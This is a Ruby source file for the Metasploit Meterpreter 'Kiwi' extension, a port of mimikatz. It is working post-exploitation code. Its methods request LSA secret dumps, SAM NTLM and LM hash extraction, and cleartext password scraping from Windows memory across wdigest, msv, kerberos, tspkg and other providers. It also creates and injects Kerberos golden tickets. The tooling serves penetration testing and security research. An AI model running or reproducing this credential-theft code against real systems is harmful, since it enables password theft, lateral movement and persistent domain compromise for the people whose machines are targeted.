# -*- coding: binary -*-

require 'rex/post/meterpreter/extensions/kiwi/tlv'
require 'csv'

module Rex
module Post
module Meterpreter
module Extensions
module Kiwi

###
#
# Kiwi extension - grabs credentials from windows memory.
#
# Benjamin DELPY `gentilkiwi`
# http://blog.gentilkiwi.com/mimikatz
#
# extension converted by OJ Reeves (TheColonial)
###

class Kiwi < Extension

  PWD_ID_SEK_ALLPASS   = 0
  PWD_ID_SEK_WDIGEST   = 1
  PWD_ID_SEK_MSV       = 2
  PWD_ID_SEK_KERBEROS  = 3
  PWD_ID_SEK_TSPKG     = 4
  PWD_ID_SEK_LIVESSP   = 5
  PWD_ID_SEK_SSP       = 6
  PWD_ID_SEK_TICKETS   = 7
  PWD_ID_SEK_DPAPI     = 8

  def initialize(client)
    super(client, 'kiwi')

    client.register_extension_aliases(
      [
        {
          'name' => 'kiwi',
          'ext'  => self
        },
      ])
  end

  def lsa_dump
    request = Packet.create_request('kiwi_lsa_dump_secrets')

    response = client.send_request(request)

    result = {
      :major    => response.get_tlv_value(TLV_TYPE_KIWI_LSA_VER_MAJ),
      :minor    => response.get_tlv_value(TLV_TYPE_KIWI_LSA_VER_MIN),
      :compname => response.get_tlv_value(TLV_TYPE_KIWI_LSA_COMPNAME),
      :syskey   => to_hex_string(response.get_tlv_value(TLV_TYPE_KIWI_LSA_SYSKEY)),
      :nt5key  => to_hex_string(response.get_tlv_value(TLV_TYPE_KIWI_LSA_NT5KEY)),
      :nt6keys  => [],
      :secrets => [],
      :samkeys => []
    }

    response.each(TLV_TYPE_KIWI_LSA_NT6KEY) do |k|
      result[:nt6keys] << {
        :id    => to_guid(k.get_tlv_value(TLV_TYPE_KIWI_LSA_KEYID)),
        :value => to_hex_string(k.get_tlv_value(TLV_TYPE_KIWI_LSA_KEYVALUE))
      }
    end

    response.each(TLV_TYPE_KIWI_LSA_SECRET) do |s|
      r = {
        :name    => s.get_tlv_value(TLV_TYPE_KIWI_LSA_SECRET_NAME),
        :service => s.get_tlv_value(TLV_TYPE_KIWI_LSA_SECRET_SERV),
        :ntlm    => to_hex_string(s.get_tlv_value(TLV_TYPE_KIWI_LSA_SECRET_NTLM)),
        :current => s.get_tlv_value(TLV_TYPE_KIWI_LSA_SECRET_CURR),
        :old     => s.get_tlv_value(TLV_TYPE_KIWI_LSA_SECRET_OLD)
      }

      r[:current] ||= to_hex_dump(s.get_tlv_value(TLV_TYPE_KIWI_LSA_SECRET_CURR_RAW))
      r[:old] ||= to_hex_dump(s.get_tlv_value(TLV_TYPE_KIWI_LSA_SECRET_OLD_RAW))

      result[:secrets] << r
    end

    response.each(TLV_TYPE_KIWI_LSA_SAM) do |s|
      result[:samkeys] << {
        :rid       => s.get_tlv_value(TLV_TYPE_KIWI_LSA_SAM_RID),
        :user      => s.get_tlv_value(TLV_TYPE_KIWI_LSA_SAM_USER),
        :ntlm_hash => to_hex_string(s.get_tlv_value(TLV_TYPE_KIWI_LSA_SAM_NTLMHASH)),
        :lm_hash   => to_hex_string(s.get_tlv_value(TLV_TYPE_KIWI_LSA_SAM_LMHASH))
      }
    end

    return result
  end

  def golden_ticket_use(ticket)
    request = Packet.create_request('kiwi_golden_ticket_use')
    request.add_tlv(TLV_TYPE_KIWI_GOLD_TICKET, ticket, false, true)

    client.send_request(request)
  end

  def golden_ticket_create(user, domain, sid, tgt)
    request = Packet.create_request('kiwi_golden_ticket_create')
    request.add_tlv(TLV_TYPE_KIWI_GOLD_USER, user)
    request.add_tlv(TLV_TYPE_KIWI_GOLD_DOMAIN, domain)
    request.add_tlv(TLV_TYPE_KIWI_GOLD_SID, sid)
    request.add_tlv(TLV_TYPE_KIWI_GOLD_TGT, tgt)

    response = client.send_request(request)

    return response.get_tlv_value(TLV_TYPE_KIWI_GOLD_TICKET)
  end

  def scrape_passwords(pwd_id)
    request = Packet.create_request('kiwi_scrape_passwords')
    request.add_tlv(TLV_TYPE_KIWI_PWD_ID, pwd_id)
    response = client.send_request(request)

    results = []
    response.each(TLV_TYPE_KIWI_PWD_RESULT) do |r|
      results << {
        :username => r.get_tlv_value(TLV_TYPE_KIWI_PWD_USERNAME),
        :domain   => r.get_tlv_value(TLV_TYPE_KIWI_PWD_DOMAIN),
        :password => r.get_tlv_value(TLV_TYPE_KIWI_PWD_PASSWORD),
        :auth_hi  => r.get_tlv_value(TLV_TYPE_KIWI_PWD_AUTH_HI),
        :auth_lo  => r.get_tlv_value(TLV_TYPE_KIWI_PWD_AUTH_LO),
        :lm       => to_hex_string(r.get_tlv_value(TLV_TYPE_KIWI_PWD_LMHASH)),
        :ntlm     => to_hex_string(r.get_tlv_value(TLV_TYPE_KIWI_PWD_NTLMHASH))
      }
    end

    return results
  end

  def all_pass
    return scrape_passwords(PWD_ID_SEK_ALLPASS)
  end

  def wdigest
    return scrape_passwords(PWD_ID_SEK_WDIGEST)
  end

  def msv
    return scrape_passwords(PWD_ID_SEK_MSV)
  end

  def livessp
    return scrape_passwords(PWD_ID_SEK_LIVESSP)
  end

  def ssp
    return scrape_passwords(PWD_ID_SEK_SSP)
  end

  def tspkg
    return scrape_passwords(PWD_ID_SEK_TSPKG)
  end

  def kerberos
    return scrape_passwords(PWD_ID_SEK_KERBEROS)
  end

protected

  def to_hex_dump(bytes)
    return nil unless bytes

    bytes.each_byte.map { |b|
      b.to_s(16).rjust(2, '0')
    }.join(' ')
  end

  def to_hex_string(bytes)
    return nil unless bytes
    bytes.unpack('H*')[0]
  end

  def to_guid(bytes)
    return nil unless bytes
    s = bytes.unpack('H*')[0]
    parts = [
      s[6, 2] + s[4, 2] + s[2, 2] + s[0, 2],
      s[10, 2] + s[8, 2],
      s[14, 2] + s[12, 2],
      s[16, 4],
      s[20, 12]
    ]
    "{#{parts.join('-')}}"
  end
end

end; end; end; end; end

